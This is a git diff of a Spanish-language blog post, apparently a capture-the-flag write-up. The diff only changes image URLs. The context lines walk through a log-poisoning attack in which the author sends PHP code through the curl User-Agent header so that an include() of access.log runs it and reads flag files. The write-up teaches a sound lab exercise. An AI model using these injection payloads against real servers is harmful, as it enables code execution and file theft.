@@ -533,24 +533,24 @@ ec e4 c3 8f 79 38 40 cf 9c 0f b7 14 95 b4 65 ee
 
 &lt;h4 id=&quot;track-me&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Track Me&lt;/h4&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128/50.png&quot; alt=&quot;50&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-09-24-MetaCTF-September-2026-Flash-CTF/50.png&quot; alt=&quot;50&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Al visitar la página principal, veremos que nuestra visita queda registrada y que podemos consultar los registros desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/logs.php&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128/51.png&quot; alt=&quot;51&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-09-24-MetaCTF-September-2026-Flash-CTF/51.png&quot; alt=&quot;51&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128/52.png&quot; alt=&quot;52&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-09-24-MetaCTF-September-2026-Flash-CTF/52.png&quot; alt=&quot;52&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Al revisar el registro, podemos ver que la aplicación guarda información de nuestra visita, incluyendo el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt;:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128/53.png&quot; alt=&quot;53&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-09-24-MetaCTF-September-2026-Flash-CTF/53.png&quot; alt=&quot;53&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Como el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; es controlado por nosotros, podemos intentar introducir código PHP dentro de este campo y explotar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log poisoning&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;?php echo &quot;P0150N3D&quot;; ?&amp;gt;&apos;&lt;/span&gt; &amp;lt;HOST&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128/54.png&quot; alt=&quot;54&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-09-24-MetaCTF-September-2026-Flash-CTF/54.png&quot; alt=&quot;54&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Esto ocurre porque &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logs.php&lt;/code&gt; utiliza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include()&lt;/code&gt; para cargar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access.log&lt;/code&gt;, haciendo que cualquier código PHP contenido en el archivo sea interpretado y ejecutado antes de mostrar su contenido.&lt;/p&gt;
 
@@ -559,7 +559,7 @@ ec e4 c3 8f 79 38 40 cf 9c 0f b7 14 95 b4 65 ee
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;?php foreach (glob(&quot;/flag-*.txt&quot;) as $f) { echo file_get_contents($f); } ?&amp;gt;&apos;&lt;/span&gt; &amp;lt;HOST&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128/55.png&quot; alt=&quot;55&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-09-24-MetaCTF-September-2026-Flash-CTF/55.png&quot; alt=&quot;55&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Esto nos devolverá la flag:&lt;/p&gt;
 
